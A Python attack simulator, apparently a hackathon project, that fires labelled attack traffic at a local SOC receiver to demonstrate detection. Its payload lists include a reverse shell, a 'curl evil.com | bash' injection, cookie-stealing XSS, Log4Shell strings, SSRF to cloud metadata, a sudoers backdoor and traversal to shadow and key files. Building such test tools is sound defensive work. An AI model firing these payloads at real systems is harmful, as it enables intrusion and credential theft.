"""
Shadow Recon — Interactive Attack Simulator
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Flow:
  1. Normal traffic streams continuously in the background.
  2. Menu appears — pick an attack type.
  3. 10-second countdown (judges can watch what's coming).
  4. Attack fires  (normal traffic pauses during attack).
  5. Attack ends → "Attack stopped" banner → normal traffic resumes.
  6. Menu reappears. Repeat forever. Press 0 to quit.

Run AFTER soc_receiver.py is started on 127.0.0.1:8000.
"""

import requests, time, random, threading, sys, os

BASE_URL     = "http://127.0.0.1:8000"
NORMAL_DELAY = 1.0    # seconds between normal background requests
ATTACK_DELAY = 0.55   # seconds between attack payloads

# ── Shared control flags ──────────────────────────────────────────────────────
_pause_normal = threading.Event()   # set  → normal thread pauses
_random_mode  = threading.Event()   # set  → continuous random mode active
_quit_flag    = threading.Event()   # set  → everything stops
_print_lock   = threading.Lock()    # avoid interleaved console lines

# ── IP pools ──────────────────────────────────────────────────────────────────
NORMAL_IPS   = [
    "10.0.0.10", "10.0.0.11", "10.0.0.25", "10.0.0.42", "192.168.1.50", "192.168.1.88", 
    "172.16.0.5", "10.0.5.101", "192.168.2.11", "172.18.44.12", "10.10.10.2", "192.168.1.15"
]
ATTACKER_IPS = [
    "185.220.101.42", "45.33.32.156", "192.168.1.105", "10.0.0.88", "203.0.113.77", 
    "198.51.100.22", "91.243.67.11", "141.101.120.2", "2.56.12.89", "104.21.32.110"
]

NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
]
ATTACK_UAS = [
    "sqlmap/1.7.8#stable",
    "Mozilla/5.0 (compatible; Nikto/2.1.6)",
    "python-requests/2.31.0",
    "Wget/1.21.4 (linux-gnu)",
    "curl/7.88.1",
]

# ── ANSI colour helpers ───────────────────────────────────────────────────────
def _c(code, t):  return f"\033[{code}m{t}\033[0m"
def green(t):     return _c("32",    t)
def yellow(t):    return _c("33",    t)
def red(t):       return _c("91",    t)
def cyan(t):      return _c("96",    t)
def dim(t):       return _c("2",     t)
def bold(t):      return _c("1",     t)
def magenta(t):   return _c("95",    t)
def white(t):     return _c("97",    t)
def bg_red(t):    return _c("41;1",  t)
def bg_green(t):  return _c("42;30", t)
def bg_cyan(t):   return _c("46;30", t)

SEV_CLR = {
    "CRITICAL": red,
    "HIGH":     yellow,
    "MEDIUM":   magenta,
    "LOW":      green,
    "INFO":     dim,
}

LINE = "─" * 62

def tprint(*args, **kwargs):
    """Thread-safe print — won't interleave with countdown bar."""
    with _print_lock:
        print(*args, **kwargs)

# ── Low-level HTTP send ───────────────────────────────────────────────────────
def send(method, path, atk_type, severity, src_ip,
         json_body=None, params=None, ua=None, prefix="  "):
    headers = {
        "X-Attack-Type":  atk_type,
        "X-Severity":     severity,
        "X-Simulated-IP": src_ip,
        "Content-Type":   "application/json",
        "User-Agent":     ua or random.choice(ATTACK_UAS),
        "Accept":         "application/json, text/plain, */*",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.7"]),
        "Referer":        random.choice([f"{BASE_URL}/", f"{BASE_URL}/dashboard", "https://google.com"]),
        "Cookie":         f"session_id={random.getrandbits(64)}; user_pref=dark; csrftoken={random.getrandbits(32)}",
        "X-Client-ID":    f"cid-{random.randint(1000, 9999)}",
        "X-Forwarded-For": f"{random.choice(ATTACKER_IPS)}, {random.choice(NORMAL_IPS)}" if random.random() > 0.5 else src_ip,
        "X-Real-IP":       src_ip,
        "X-Frame-Options": "SAMEORIGIN",
        "X-XSS-Protection": "1; mode=block"
    }
    try:
        r = requests.request(method, BASE_URL + path,
                             headers=headers, json=json_body,
                             params=params, timeout=4)
        clr  = SEV_CLR.get(severity, dim)
        label = f"[{severity:8s}]"
        tprint(f"{prefix}{clr(label)}  {white(atk_type):<40}  "
               f"{dim(src_ip):<17}  HTTP {r.status_code}")
    except requests.exceptions.ConnectionError:
        tprint(red(f"  [ERROR] Cannot reach {BASE_URL} — is soc_receiver.py running?"))

# ═══════════════════════════════════════════════════════════════════════════════
# NORMAL TRAFFIC — runs forever in background thread
# ═══════════════════════════════════════════════════════════════════════════════
NORMAL_ROUTES = [
    ("GET",  "/",              None,                          None),
    ("GET",  "/dashboard",     None,                          {"tab": "overview", "theme": "dark"}),
    ("POST", "/api/auth",      {"user":"alice","pass":"ok","mfa":"verified"},  None),
    ("GET",  "/api/users",     None,                          {"limit": "20", "offset": "0", "sort": "desc"}),
    ("GET",  "/static/app.js", None,                          None),
    ("GET",  "/health",        None,                          {"check": "full"}),
    ("POST", "/api/log",       {"level":"info","msg":"ui_interaction","component":"Header"}, None),
    ("GET",  "/search",        None,                          {"q":"quarterly report", "filter": "recent"}),
    ("GET",  "/api/profile",   None,                          {"id": "42", "include": "metadata"}),
    ("POST", "/api/feedback",  {"rating":5,"msg":"Great dashboard!","user_id":101},   None),
    ("GET",  "/api/settings",  None,                          {"user_id": "101", "scope": "global"}),
    ("POST", "/api/heartbeat", {"status":"active", "uptime": 12400},           None),
    ("GET",  "/assets/logo.png", None,                         None),
    ("GET",  "/api/v1/inventory", None,                        {"category": "servers", "status": "online"}),
    ("GET",  "/docs/api-guide.pdf", None,                      None),
    ("GET",  "/api/v2/metrics", None,                         {"interval": "1m", "source": "node-01"}),
    ("POST", "/api/v1/telemetry", {"event":"page_view","url":"/dashboard"}, None),
    ("GET",  "/api/v1/alerts/summary", None,                  {"severity": "low"}),
]

def normal_traffic_loop():
    while not _quit_flag.is_set():
        if _pause_normal.is_set():
            time.sleep(0.15)
            continue
        method, path, body, qp = random.choice(NORMAL_ROUTES)
        ip = random.choice(NORMAL_IPS)
        ua = random.choice(NORMAL_UAS)
        send(method, path, "NORMAL_TRAFFIC", "INFO", ip,
             json_body=body, params=qp, ua=ua, prefix=dim("  "))
        jitter = NORMAL_DELAY + random.uniform(-0.3, 0.4)
        time.sleep(jitter)

# ═══════════════════════════════════════════════════════════════════════════════
# CONTINUOUS RANDOM MODE
# ═══════════════════════════════════════════════════════════════════════════════

def random_attack_loop():
    """Triggers a random attack every 10 seconds if _random_mode is set."""
    while not _quit_flag.is_set():
        if not _random_mode.is_set():
            time.sleep(1.0)
            continue
            
        idx = random.randint(0, len(ATTACKS) - 1)
        attack_name, attack_fn = ATTACKS[idx]
        
        with _print_lock:
            print("\n" + bg_cyan(bold(f"  🎲  AUTO-TRIGGER (Random Mode) : [{idx+1:2d}] {attack_name}  ")))
        
        # We reuse the same logic as manual trigger (countdown + pause + fire)
        # But we do it in this background thread. 
        # Note: countdown() prints to stdout, so we keep it.
        countdown(attack_name, seconds=5) # shorter countdown for auto mode
        
        _pause_normal.set()
        try:
            attack_fn()
        except Exception as e:
            tprint(red(f"  [ERROR during auto-attack] {e}"))
        _pause_normal.clear()
        
        stopped_banner(attack_name)
        
        # Wait 10 seconds before next random selection
        for _ in range(10):
            if not _random_mode.is_set() or _quit_flag.is_set(): break
            time.sleep(1)

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK DEFINITIONS
# ═══════════════════════════════════════════════════════════════════════════════

def sql_injection():
    for p in ["' OR '1'='1",
              "1; DROP TABLE users--",
              "' UNION SELECT username,password,role FROM users WHERE '1'='1",
              "admin'--",
              "1' AND SLEEP(5)--",
              "'; EXEC xp_cmdshell('whoami')--",
              "1' OR EXISTS(SELECT * FROM information_schema.tables)--",
              "<@RANDOM_STRING@>' OR '1'='1"]:
        p = p.replace("<@RANDOM_STRING@>", "".join(random.choices("abcdef", k=4)))
        send("POST", "/login", "SQL_INJECTION", "CRITICAL",
             random.choice(ATTACKER_IPS),
             json_body={"username": p, "password": "password" + str(random.randint(100,999)), "debug": True})
        time.sleep(ATTACK_DELAY)

def xss_attack():
    for p in ["<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
              "<img src=x onerror=alert(1)>",
              "javascript:alert('XSS')",
              "<svg/onload=fetch('http://attacker.com/'+btoa(localStorage.token))>",
              "<details/open/ontoggle=import('//evil.xyz')>",
              "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
              "<math><mtext><option><annotation><map><select><script>alert(1)</script>"]:
        send("GET", "/search", "XSS_REFLECTED", "HIGH",
             random.choice(ATTACKER_IPS), params={"q": p, "utm_source": "internal_test", "ref": "sidebar"})
        time.sleep(ATTACK_DELAY)

def brute_force_login():
    for user in ["admin", "root", "support", "guest", "service"]:
        for pwd in ["password", "123456", "admin", "letmein", "qwerty", "pass@123"]:
            send("POST", "/api/auth", "BRUTE_FORCE_LOGIN", "HIGH",
                 "185.220.101.42",
                 json_body={"user": user, "pass": pwd, "login_attempt": random.randint(1, 50)},
                 ua=random.choice(ATTACK_UAS))
            time.sleep(ATTACK_DELAY * 0.2)

def directory_traversal():
    for p in ["/../../../etc/passwd",
              "/../../../windows/system32/drivers/etc/hosts",
              "/..%2F..%2F..%2Fetc%2Fshadow",
              "/%2e%2e/%2e%2e/etc/passwd",
              "/static/../../../etc/mysql/my.cnf",
              "/api/v1/download?file=../../../../root/.ssh/id_rsa",
              "/view?path=C:\\Windows\\System32\\Config\\SAM",
              "/..%5c..%5c..%5c..%5cboot.ini"]:
        send("GET", p, "DIRECTORY_TRAVERSAL", "HIGH",
             random.choice(ATTACKER_IPS), params={"debug": "true", "admin": "1"})
        time.sleep(ATTACK_DELAY)

def command_injection():
    for body in [{"host": "127.0.0.1; cat /etc/passwd"},
                 {"host": "localhost | whoami"},
                 {"host": "`id`"},
                 {"host": "$(curl http://evil.com/shell.sh | bash)"},
                 {"host": "127.0.0.1 && netstat -ano"},
                 {"host": "; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"}]:
        send("POST", "/api/ping", "COMMAND_INJECTION", "CRITICAL",
             random.choice(ATTACKER_IPS), json_body=body)
        time.sleep(ATTACK_DELAY)

def ssrf_attack():
    for url in ["http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://localhost:6379/",
                "file:///etc/passwd",
                "http://192.168.1.1/admin",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "ftp://127.0.0.1:21/test.txt",
                "gopher://attacker.com:1234/_GET%20/"]:
        send("POST", "/api/fetch", "SSRF_ATTEMPT", "CRITICAL",
             random.choice(ATTACKER_IPS), json_body={"url": url, "timeout": 5, "verify": False})
        time.sleep(ATTACK_DELAY)

def xxe_injection():
    payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><n>&xxe;</n></user>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.com/eval.dtd">%remote;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><user><n>&xxe;</n></user>'
    ]
    for p in payloads:
        send("POST", "/api/xml", "XXE_INJECTION", "HIGH",
             random.choice(ATTACKER_IPS), json_body={"raw": p, "parse_external": True})
        time.sleep(ATTACK_DELAY)

def credential_stuffing():
    for user, pwd in [("alice@corp.com","Summer2023!"),
                      ("bob@corp.com","Welcome1"),
                      ("carol@corp.com","Corp@2024"),
                      ("admin@corp.com","Admin123"),
                      ("sysadmin","P@ssw0rd")]:
        send("POST", "/oauth/token", "CREDENTIAL_STUFFING", "HIGH",
             "45.33.32.156",
             json_body={"grant_type":"password",
                        "username":user,"password":pwd})
        time.sleep(ATTACK_DELAY * 0.5)

def port_scan():
    targets = ["192.168.1.0/24", "10.0.0.0/8", "172.16.0.0/12"]
    for port in [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 27017]:
        send("GET", "/probe", "PORT_SCAN", "MEDIUM",
             "45.33.32.156",
             params={"target": random.choice(targets), "port": port, "stealth": "T4", "banner": "true"})
        time.sleep(ATTACK_DELAY * 0.2)

def ransomware_c2_beacon():
    for i in range(5):
        path = random.choice(["/c2/checkin", "/api/v2/heartbeat", "/sys/update"])
        send("POST", path, "RANSOMWARE_C2_BEACON", "CRITICAL",
             "10.0.0.88",
             json_body={"bot_id":f"WIN-CORP-{random.getrandbits(16):X}", "hostname":"FINANCE-PC-03",
                        "os":"Windows 10 Pro", "beacon":i+1,
                        "cmd":"ENCRYPT" if i==4 else "IDLE",
                        "key_exchange": "DH-Group14" if i==0 else None,
                        "encryption_status": "pending" if i < 4 else "active"})
        time.sleep(ATTACK_DELAY)

def dns_tunnel_exfil():
    chunks = [
        "dGhpcyBpcyBzZW5zaXRpdmUgZGF0YQ==",
        "Y3VzdG9tZXJfbGlzdF8yMDI0LmNzdg==",
        "cGF5cm9sbF9leHBvcnQueGxzeA==",
        "c2VjcmV0X2tleV9kb250X3NoYXJl",
        "YWRtaW5fcGFzc3dvcmRzLnR4dA=="
    ]
    for chunk in chunks:
        send("GET", "/dns/query", "DNS_TUNNEL_EXFIL", "CRITICAL",
             "10.0.0.88",
             params={"q": f"{chunk}.ns{random.randint(1,4)}.rev-dns.attacker.com", "type": "TXT", "id": random.randint(1000,9999)})
        time.sleep(ATTACK_DELAY)

def privilege_escalation():
    for a in [{"cmd":"sudo su -","user":"www-data"},
              {"cmd":"chmod +s /bin/bash","user":"www-data"},
              {"cmd":"crontab -e","user":"jenkins"},
              {"cmd":"pkexec /usr/bin/bash","user":"nobody"},
              {"cmd":"find / -perm -4000 2>/dev/null","user":"guest"},
              {"cmd":"echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","user":"root"}]:
        send("POST", "/api/exec", "PRIVILEGE_ESCALATION", "CRITICAL",
             "192.168.1.105", json_body=a, ua="Gnu/Linux Bash Shell")
        time.sleep(ATTACK_DELAY)

def lateral_movement_smb():
    for t in ["192.168.1.10","192.168.1.20","192.168.1.50","192.168.1.100","10.0.0.5","172.16.1.10"]:
        send("POST", "/smb/connect", "LATERAL_MOVEMENT_SMB", "HIGH",
             "10.0.0.88",
             json_body={"target":t,"share":"ADMIN$","user":"Administrator","domain":"CORP.INTERNAL","method":"psexec"})
        time.sleep(ATTACK_DELAY)

def ddos_flood():
    for _ in range(25):
        send("GET", "/", "DDOS_HTTP_FLOOD", "HIGH",
             random.choice(ATTACKER_IPS), ua=random.choice(ATTACK_UAS))
        time.sleep(ATTACK_DELAY * 0.05)

def zero_day_exploit():
    for p in ["${jndi:ldap://attacker.com/a}",
              "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/x}",
              "${jndi:rmi://attacker.com:1099/payload}",
              "${jndi:dns://attacker.com/xyz}",
              "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1:1389/Exploit}"]:
        send("POST", "/api/log", "ZERO_DAY_EXPLOIT", "CRITICAL",
             random.choice(ATTACKER_IPS),
             json_body={"message": p, "level": "error", "component": "Log4j-Service", "version": "2.14.1"})
        time.sleep(ATTACK_DELAY)

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════
ATTACKS = [
    ("SQL Injection",                sql_injection),
    ("XSS (Cross-Site Scripting)",   xss_attack),
    ("Brute-Force Login",            brute_force_login),
    ("Directory Traversal / LFI",    directory_traversal),
    ("Command Injection",            command_injection),
    ("SSRF",                         ssrf_attack),
    ("XXE Injection",                xxe_injection),
    ("Credential Stuffing",          credential_stuffing),
    ("Port Scan / Enumeration",      port_scan),
    ("Ransomware C2 Beacon",         ransomware_c2_beacon),
    ("DNS Tunnel Exfiltration",      dns_tunnel_exfil),
    ("Privilege Escalation",         privilege_escalation),
    ("Lateral Movement (SMB)",       lateral_movement_smb),
    ("DDoS HTTP Flood",              ddos_flood),
    ("Zero-Day Exploit (Log4Shell)", zero_day_exploit),
]

# ═══════════════════════════════════════════════════════════════════════════════
# UI HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear_screen()
    print(cyan(bold("╔══════════════════════════════════════════════════════════════╗")))
    print(cyan(bold("║      SHADOW RECON  ·  Interactive SOC Attack Simulator      ║")))
    print(cyan(bold("║      SIH-2025  ·  PS0202  ·  Vidhit Technologies            ║")))
    print(cyan(bold("╚══════════════════════════════════════════════════════════════╝")))
    print(dim(f"  Target  : {BASE_URL}"))
    print(dim(f"  Attacks : {len(ATTACKS)}  |  Type 0 to quit"))
    print()

def show_menu():
    print()
    print(bold(white("  " + "─" * 60)))
    print(bold(white("   ATTACK MENU  —  Normal traffic is running in background")))
    print(bold(white("  " + "─" * 60)))
    for i, (name, _) in enumerate(ATTACKS, 1):
        # colour by severity tier
        if i in (1, 5, 6, 10, 11, 12, 15):
            idx_str = red(bold(f"  [{i:2d}]"))
        elif i in (2, 3, 4, 7, 8, 13, 14):
            idx_str = yellow(bold(f"  [{i:2d}]"))
        else:
            idx_str = magenta(bold(f"  [{i:2d}]"))
        print(f"  {idx_str}  {name}")
    print()
    print(f"  {bg_cyan(bold(' [ R ] '))}  {cyan(bold('START'))} Continuous Random Mode {dim('(triggers every 10s)')}")
    print(f"  {bg_red(bold(' [ S ] '))}  {red(bold('STOP '))} Continuous Random Mode")
    print()
    print(f"  {dim('[0]')}  {dim('Exit simulator')}")
    print(bold(white("  " + "─" * 60)))
    print()

def countdown(attack_name, seconds=10):
    """Animated countdown bar. Runs in main thread so normal thread keeps printing."""
    print()
    print(bg_red(bold(f"  ⚡  ATTACK SELECTED : {attack_name.upper()}  ⚡")))
    print()
    for i in range(seconds, 0, -1):
        filled = seconds - i
        bar    = red("█" * filled) + dim("░" * i)
        with _print_lock:
            sys.stdout.write(
                f"\r  {yellow('LAUNCHING IN')}  "
                f"{red(bold(str(i).rjust(2)))} sec  [{bar}]   "
            )
            sys.stdout.flush()
        time.sleep(1)

    # clear the countdown line
    with _print_lock:
        sys.stdout.write("\r" + " " * 72 + "\r")
        sys.stdout.flush()

    print(bg_red(bold(f"  🔴  ATTACK STARTED : {attack_name.upper()}")))
    print(red("  " + "─" * 60))

def stopped_banner(attack_name):
    print(red("  " + "─" * 60))
    print(bg_green(bold(f"  ✅  ATTACK STOPPED : {attack_name.upper()}")))
    print(green("  Normal traffic resuming…"))
    time.sleep(2.0)

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    print_banner()

    # ── Start background normal traffic ───────────────────────────────────────
    bg = threading.Thread(target=normal_traffic_loop, daemon=True)
    bg.start()

    # ── Start background random attack loop ──────────────────────────────────
    ra = threading.Thread(target=random_attack_loop, daemon=True)
    ra.start()

    print(green(bold("  ✔  Normal traffic started — background stream is LIVE")))
    print(dim("     (INFO requests will appear below as they fire)"))
    time.sleep(2)   # let a couple normal requests show before menu appears

    # ── Main interactive loop ─────────────────────────────────────────────────
    while not _quit_flag.is_set():
        show_menu()

        try:
            choice = input(cyan("  Enter attack number › ")).strip()
        except (EOFError, KeyboardInterrupt):
            choice = "0"

        # ── Quit ──────────────────────────────────────────────────────────────
        if choice in ("0", "q", "quit", "exit"):
            break

        # ── Random Mode Start/Stop ───────────────────────────────────────────
        if choice.lower() == "r":
            if _random_mode.is_set():
                print(yellow("  !  Random mode is already running."))
            else:
                _random_mode.set()
                print(bg_cyan(bold("  ✔  CONTINUOUS RANDOM MODE ACTIVATED  ")))
                print(dim("     (Attacks will start triggering every 10s)"))
            time.sleep(1.5)
            continue

        if choice.lower() == "s":
            if not _random_mode.is_set():
                print(yellow("  !  Random mode is not running."))
            else:
                _random_mode.clear()
                print(bg_red(bold("  ✘  CONTINUOUS RANDOM MODE DEACTIVATED  ")))
            time.sleep(1.5)
            continue

        # ── Numbered choice ────────────────────────────────────────────────────
        if choice.isdigit() and (1 <= int(choice) <= len(ATTACKS)):
            if _random_mode.is_set():
                print(red("  ✘  Please STOP random mode [S] before manual selection."))
                time.sleep(1.5)
                continue
            idx = int(choice) - 1
            attack_name, attack_fn = ATTACKS[idx]

        else:
            print(red("  ✘  Invalid — enter a number, R for random, or 0 to quit."))
            time.sleep(1.5)
            continue

        # ── 10-second countdown (normal traffic still flowing) ────────────────
        countdown(attack_name, seconds=10)

        # ── Pause normal traffic, fire attack ─────────────────────────────────
        _pause_normal.set()
        time.sleep(0.25)     # let background thread finish its current request

        try:
            attack_fn()
        except Exception as e:
            tprint(red(f"  [ERROR during attack] {e}"))

        # ── Resume normal traffic ─────────────────────────────────────────────
        _pause_normal.clear()
        stopped_banner(attack_name)

    # ── Exit ──────────────────────────────────────────────────────────────────
    _quit_flag.set()
    print()
    print(cyan(bold("  Shadow Recon simulation ended.")))
    print(dim(f"  Full report → {BASE_URL}/soc/report"))
    print()

if __name__ == "__main__":
    main()
